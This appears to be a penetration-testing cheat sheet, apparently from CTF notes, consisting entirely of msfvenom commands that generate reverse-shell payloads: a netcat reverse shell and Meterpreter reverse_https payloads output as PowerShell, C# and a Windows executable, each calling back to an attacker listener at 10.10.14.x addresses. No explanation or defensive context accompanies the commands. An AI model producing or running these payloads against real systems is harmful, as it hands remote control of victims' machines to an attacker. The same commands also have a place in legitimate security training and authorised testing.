### Netcat

```bash
sudo msfvenom -p cmd/unix/reverse_netcat lhost=10.10.14.127 lport=4444
```

## PowerShell

```bash
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=443 -f ps1
```

### Csharp

```bash
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=443 -f csharp
```

### Exe

```bash
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=443 -f exe > shell.exe
```
